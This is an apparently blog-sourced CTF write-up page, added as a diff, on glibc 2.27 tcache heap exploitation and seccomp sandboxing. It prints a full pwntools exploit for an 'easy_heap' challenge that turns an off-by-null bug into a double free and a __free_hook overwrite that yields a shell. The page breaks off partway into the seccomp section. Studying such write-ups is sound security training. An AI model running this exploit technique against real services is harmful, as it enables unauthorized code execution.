@@ -1,0 +1,597 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>堆进阶学习之4大利器 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一、Tcache攻击前言：​        之前打比赛一直都是做ubuntu16.04的，很少做ubuntu18下的（有tcache机制），护网杯有道题是libc-2.27.so，我一开始不会做tc,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">堆进阶学习之4大利器</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/4%E5%A4%A9%E6%AF%94%E8%B5%9B%E6%89%80%E5%AD%A6/" title="堆进阶学习之4大利器" class="">堆进阶学习之4大利器</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    60k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    54 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/tcache/" rel="tag">tcache</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" rel="tag">条件竞争</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E6%B2%99%E7%AE%B1/" rel="tag">沙箱</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h3 id="一、Tcache攻击"><a href="#一、Tcache攻击" class="headerlink" title="一、Tcache攻击"></a>一、Tcache攻击</h3><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>​        之前打比赛一直都是做ubuntu16.04的，很少做ubuntu18下的（有tcache机制），护网杯有道题是libc-2.27.so，我一开始不会做tcache，学了一晚上，理解了基础的原理和攻击方式，这里做个小小的总结。</p>
+<p>首先是tcache的原理，这个在ctfwiki上讲的挺透彻的，这里做个复习。</p>
+<a id="more"></a>
+
+<h4 id="1、重点需要理解的2个函数："><a href="#1、重点需要理解的2个函数：" class="headerlink" title="1、重点需要理解的2个函数："></a>1、重点需要理解的2个函数：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#堆块<span class="built_in">free</span>后放入tcache</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line">#就是一个头插法，可以看到几乎没有任何的检查，那么可以<span class="keyword">double</span> <span class="built_in">free</span>，还更简单</span><br><span class="line">#从tcache中取出堆块</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line">#从头部取出堆块</span><br></pre></td></tr></table></figure>
+
+<p>通过读源码，我们可以理解到，tcache的机制大概就是，他是类似fastbin的单链表，但是check只检查next是否为空，并不检查size，而且指针直接指向的是string块(意味着任意地址写)，一个数组下标能容纳7个堆块，堆块的大小最大是0x408，超过的会被放到unsorted bin中，它的插入方式也是和栈一样，后进先出，总是在链表头操作插入和取出，这里用代码演示下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0x20</span>,<span class="string">'a\n'</span>)</span><br><span class="line">malloc(<span class="number">0x40</span>,<span class="string">'c\n'</span>)</span><br><span class="line">malloc(<span class="number">0x50</span>,<span class="string">'d\n'</span>)</span><br><span class="line">malloc(<span class="number">0x50</span>,<span class="string">'dddd\n'</span>)</span><br><span class="line">malloc(<span class="number">0x70</span>,<span class="string">'e\n'</span>)</span><br><span class="line">malloc(<span class="number">0x100</span>,<span class="string">'f\n'</span>)</span><br><span class="line">malloc(<span class="number">0x200</span>,<span class="string">'g\n'</span>)</span><br><span class="line">malloc(<span class="number">0x200</span>,<span class="string">'g\n'</span>)</span><br><span class="line">malloc(<span class="number">0x200</span>,<span class="string">'g\n'</span>)</span><br><span class="line">malloc(<span class="number">0x200</span>,<span class="string">'g\n'</span>)</span><br><span class="line">malloc(<span class="number">0x200</span>,<span class="string">'g\n'</span>)</span><br><span class="line">malloc(<span class="number">0x200</span>,<span class="string">'g\n'</span>)</span><br><span class="line">malloc(<span class="number">0x200</span>,<span class="string">'g\n'</span>)</span><br><span class="line">malloc(<span class="number">0x200</span>,<span class="string">'g\n'</span>)</span><br><span class="line">malloc(<span class="number">0x200</span>,<span class="string">'g\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">	free(i)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1568271220894.png" alt="56827122089"></p>
+<p><img src="/blog_img/1568271351385.png" alt="56827135138"></p>
+<p>这样就能理解，tcache是直接链接内容块，而不是size那个地址，然后是0x8到0x408大小的堆块都可以作为结构体数组的一个下标(自己会根据size对齐)，所以数组还是挺大的，当相同大小的堆块填满7个后，就会根据实际的大小放到其他的bins中，这是和2.23一样的了，比如，0x210那个，填满7个堆块，就会放到unsortedbin中。这里再次利用时，只要tcache中有满足条件的堆块，就会直接使用tcache，因为是最快的(牺牲了check，速度换安全)</p>
+<h4 id="2、知道了tcache的原理后，下面是攻击方式的演示"><a href="#2、知道了tcache的原理后，下面是攻击方式的演示" class="headerlink" title="2、知道了tcache的原理后，下面是攻击方式的演示"></a>2、知道了tcache的原理后，下面是攻击方式的演示</h4><p>1、改变FD指针，这种很常见，也是最简单的一种攻击(利用它不检查size大小，任意地址写),后面的讲解中会多次题目接触，这里就先不展开了。</p>
+<p>2、double free(老版本有，新版本有检查，所以被禁用了，但是可以通过overlapping heap chunk来实现double free)</p>
+<p>3、house of spirit（这里只需要一个可控区域即可，还要能覆盖堆地址），因为tcache不检查next chunk的size位，很方便。</p>
+<p>这里介绍下overlap_heap_chunk的利用（我叫它夹心饼攻击）：</p>
+<p>先讲大概的利用思路：</p>
+<p>1、先实现unsortd bin 分配（tcache机制）</p>
+<p>2、夹心饼攻击（free1——&gt;used2——&gt;used3），通过used2的溢出，伪造好used3的preszie为前面2个的大小，used3的pre_inuse为0(使得used2为free状态，可以通过offbynull来实现)，接着再free掉used3，即可实现unlink合并到free1，此时free1的大小为3个chunk的大小，切割1次，出去used1，切割第二次，得到used2，这样我们就有了2个used2，但是id不同，那么就可以实现double free了，接着就好做了。</p>
+<p>3、house of spirit（不检查next的size，所以只需要一个可控区域即可，同时需要满足能覆盖堆地址）</p>
+<h4 id="下面通过一道题来了解下tcache的机制以及利用："><a href="#下面通过一道题来了解下tcache的机制以及利用：" class="headerlink" title="*下面通过一道题来了解下tcache的机制以及利用："></a>*下面通过一道题来了解下tcache的机制以及利用：</h4><p>easy_heap</p>
+<p><img src="/blog_img/1568431807300.png" alt="56843180730"></p>
+<p>保护全开(后期习惯就好)，直奔ida主逻辑：</p>
+<p><img src="/blog_img/1568431755738.png" alt="56843175573"></p>
+<p>正常的puts函数、exit函数和free函数，没有什么漏洞点，重点是malloc函数：</p>
+<p><img src="/blog_img/1568431915270.png" alt="56843191527"></p>
+<p><img src="/blog_img/1568431922270.png" alt="56843192227"></p>
+<p>这个read_content就是漏洞点函数，可看到对于输入的限制是不能为空字节，且结束了输入会将最后一个字节置为null，很明显的offbynull漏洞，一般的思路就是unlink攻击，改0x101为0x100(申请大小为0xf8)，但是现在没有堆地址和真实地址，还开了pie，比较难搞。这里就要用到unsorted bin中的一些知识和技巧了（overlap chunk触发double free）</p>
+<p>重点是堆块布局，也就是我们说的夹心饼攻击！</p>
+<p>1、脑子里先想好堆块的布局，这里堆块只有10块，7个tcache和3个unsorted bin的堆块，我们利用unlink过程中自动写pre_size来获得有\x00的大小（无法自己写入，只能用系统写入的方式）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">clear_tcache(<span class="number">10</span>,<span class="number">0x2</span>,<span class="string">'a'</span>)</span><br><span class="line">fill_tcache(<span class="number">3</span>,<span class="number">10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#pre100</span></span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#pre200</span></span><br><span class="line">clear_tcache(<span class="number">7</span>,<span class="number">0x2</span>,<span class="string">'b'</span>)</span><br><span class="line">malloc(<span class="number">0x2</span>,<span class="string">'7'</span>)</span><br><span class="line">malloc(<span class="number">0x2</span>,<span class="string">'8'</span>)<span class="comment">#pre100</span></span><br><span class="line">malloc(<span class="number">0x2</span>,<span class="string">'9'</span>)<span class="comment">#pre200</span></span><br></pre></td></tr></table></figure>
+
+<p>2、由于大小是0x101，所以首先得有1个堆块在unsorted bin中，然后另外2个在unsorted中是used状态，其中第二个堆块要实现offbynull使得第三个堆块认为它是free状态，而第三个堆块的pre_size是0x200，从而构造好了夹心饼攻击的条件了,然后让第三个堆块释放后在unsortedbin中，实现overlap chunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fill_tcache(<span class="number">0</span>,<span class="number">7</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">clear_tcache(<span class="number">7</span>,<span class="number">0x2</span>,<span class="string">'d'</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">malloc(<span class="number">0xf8</span>,<span class="string">'t'</span>)</span><br><span class="line">malloc(<span class="number">0x2</span>,<span class="string">'u'</span>)</span><br><span class="line">fill_tcache(<span class="number">0</span>,<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+
+<p>3、再次切出来就能再次得到那个unsorted bin的2号堆块，就可以泄露地址了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clear_tcache(<span class="number">7</span>,<span class="number">0x2</span>,<span class="string">'k'</span>)</span><br><span class="line">malloc(<span class="number">0x4</span>,<span class="string">'eight'</span>)</span><br><span class="line">puts(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
+
+<p>4、最后double free，但是因为申请个数不够，所以还得free8个，然后申请7个清空tcache，才能有机会让free_hook被申请到，直接覆盖为onegadget，直接打。这里system打不通，因为free时，有个memset(0)的清空操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">malloc(0x5,&#39;night&#39;)</span><br><span class="line"></span><br><span class="line">free(7)</span><br><span class="line">free(9)</span><br><span class="line"></span><br><span class="line">malloc(0x10,p64(free_hook))</span><br><span class="line">malloc(0x10,p64(free_hook))</span><br><span class="line"></span><br><span class="line">fill_tcache(0,8)</span><br><span class="line">clear_tcache(7,0x2,&#39;o&#39;)</span><br><span class="line">malloc(0x10,p64(onegadget))</span><br><span class="line">free(9)</span><br></pre></td></tr></table></figure>
+
+<p>完整的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./easy_heap'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"which command?\n&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"size \n&gt; "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"content \n&gt; "</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"which command?\n&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"index \n&gt; "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"which command?\n&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"index \n&gt; "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill_tcache</span><span class="params">(start,end)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start,end):</span><br><span class="line">        free(i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear_tcache</span><span class="params">(number,size,content)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(number):</span><br><span class="line">        malloc(size,content)</span><br><span class="line">clear_tcache(<span class="number">10</span>,<span class="number">0x2</span>,<span class="string">'a'</span>)</span><br><span class="line">fill_tcache(<span class="number">3</span>,<span class="number">10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#pre100</span></span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#pre200</span></span><br><span class="line">clear_tcache(<span class="number">7</span>,<span class="number">0x2</span>,<span class="string">'b'</span>)</span><br><span class="line">malloc(<span class="number">0x2</span>,<span class="string">'7'</span>)</span><br><span class="line">malloc(<span class="number">0x2</span>,<span class="string">'8'</span>)</span><br><span class="line">malloc(<span class="number">0x2</span>,<span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line">fill_tcache(<span class="number">0</span>,<span class="number">7</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">clear_tcache(<span class="number">7</span>,<span class="number">0x2</span>,<span class="string">'d'</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">malloc(<span class="number">0xf8</span>,<span class="string">'t'</span>)</span><br><span class="line">malloc(<span class="number">0x2</span>,<span class="string">'u'</span>)</span><br><span class="line">fill_tcache(<span class="number">0</span>,<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">clear_tcache(<span class="number">7</span>,<span class="number">0x2</span>,<span class="string">'k'</span>)</span><br><span class="line">malloc(<span class="number">0x4</span>,<span class="string">'eight'</span>)</span><br><span class="line">puts(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc_hook---&gt;"</span> + hex(malloc_hook)</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">malloc(<span class="number">0x5</span>,<span class="string">'night'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,p64(free_hook))</span><br><span class="line">malloc(<span class="number">0x10</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">fill_tcache(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">clear_tcache(<span class="number">7</span>,<span class="number">0x2</span>,<span class="string">'o'</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,p64(onegadget))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#debug(0)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>getshell：</p>
+<p><img src="/blog_img/1568437429907.png" alt="56843742990"></p>
+<h3 id="二、-沙箱规则"><a href="#二、-沙箱规则" class="headerlink" title="二、 沙箱规则"></a>二、 沙箱规则</h3><h4 id="前言：-1"><a href="#前言：-1" class="headerlink" title="前言："></a>前言：</h4><p>之前一直看到过prctl函数，但是不知道它是干嘛的，只是听师兄说可以禁用掉execve函数，就没有system和onegadget了，在byteCTF中终于见证了一次，这次是沙箱规则的熟悉，趁机学习一波。</p>
+<h4 id="1、prctl-函数"><a href="#1、prctl-函数" class="headerlink" title="1、prctl 函数"></a>1、prctl 函数</h4><p>先来看下函数的原型：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里有5个参数，重点看option就知道它是想干嘛，这里主要关注2点：</p>
+<p>PR_SET_NO_NEW_PRIVS(38)</p>
+<p>PR_SET_SECCOMP(22)</p>
+<p>我们通俗易懂地理解就是，prctl(38, 1LL, 0LL, 0LL, 0LL)表示禁用系统调用，也就是system和onegadget都没了,还会教子进程也这么干，很坏；而prctl(22，2)表示设置沙箱规则，从而可以实现改变函数的系统调用（通行或者禁止），这次重点研究沙箱规则，设置 seccomp ，其实也就是设置沙箱规则，这个 option 有两个子参数：</p>
+<p>1、SECCOMP_MODE_STRICT(1)：允许线程进行的唯一系统调用是read（2），write（2），_ exit（2）（但不是exit_group（2））和sigreturn（2）。</p>
+<p>2、SECCOMP_MODE_FILTER(2) (since Linux 3.5)：允许的系统调用由指向arg3中传递的Berkeley Packet Filter的指针定义。 这个参数是一个指向struct sock_fprog的指针; 它可以设计为过滤任意系统调用和系统调用参数,看下源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>	<span class="comment">/* Filter block */</span></span><br><span class="line">	__u16	code;   <span class="comment">/* Actual filter code */</span></span><br><span class="line">	__u8	jt;	<span class="comment">/* Jump true */</span></span><br><span class="line">	__u8	jf;	<span class="comment">/* Jump false */</span></span><br><span class="line">	__u32	k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span>	<span class="comment">/* Required for SO_ATTACH_FILTER. */</span></span><br><span class="line">	<span class="keyword">unsigned</span> short		len;	<span class="comment">/* Number of filter blocks */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> *<span class="title">filter</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
